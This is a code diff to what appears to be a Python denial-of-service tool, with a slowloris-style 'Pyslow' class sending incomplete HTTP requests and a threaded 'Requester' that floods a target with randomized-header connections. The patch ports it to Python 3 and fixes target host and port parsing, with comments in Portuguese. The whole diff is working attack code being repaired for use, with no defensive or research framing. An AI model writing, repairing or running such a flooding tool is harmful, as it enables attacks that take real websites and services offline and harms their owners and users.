@@ -81,6 +81,8 @@ def fake_ip():
 
 def check_tgt(args):
 	tgt = args.d
+	raw = tgt if tgt.startswith(('http://', 'https://')) else 'http://' + tgt
+	tgt = urllib.parse.urlparse(raw).hostname or tgt
 	try:
 		ip = gethostbyname(tgt)
 	except:
@@ -125,7 +127,7 @@ class Pyslow:
 			   'Host:' + self.tgt + '\r\n' + \
 			   'User-Agent:' + choice(add_useragent()) + '\r\n' + \
 			   'Content-Length: 42\r\n'
-		pkt = buffer(text)
+		pkt = text.encode('utf-8')
 		return pkt
 
 	def building_socket(self):
@@ -221,13 +223,19 @@ class Requester(Thread):
 		self.req = []
 		self.lock = Lock()
 
-		url_type = urllib.parse.urlparse(self.tgt)
-		if url_type.scheme == 'https':
+		# Se target vem como host:porta ou http://host:porta, extrai
+		raw = tgt
+		if not raw.startswith(("http://", "https://")):
+			raw = "http://" + raw
+		url_type = urllib.parse.urlparse(raw)
+		if url_type.scheme == "https":
 			self.ssl = True
-			if self.ssl == True:
-				self.port = 443
+			self.port = url_type.port or 443
 		else:
-			self.port = 80
+			self.ssl = False
+			self.port = url_type.port or 80
+		# para HTTPConnection usar hostname, não URL completa
+		self.host = url_type.hostname or self.tgt
 
 	def header(self):
 		cachetype = ['no-cache', 'no-store', 'max-age=' + str(randint(0, 10)), 'max-stale=' + str(randint(0, 100)),
@@ -269,9 +277,9 @@ class Requester(Thread):
 
 		try:
 			if self.ssl:
-				conn = http.client.HTTPSConnection(self.tgt, self.port)
+				conn = http.client.HTTPSConnection(self.host, self.port)
 			else:
-				conn = http.client.HTTPConnection(self.tgt, self.port)
+				conn = http.client.HTTPConnection(self.host, self.port)
 				self.req.append(conn)
 			for reqter in self.req:
 				(url, http_header) = self.data()
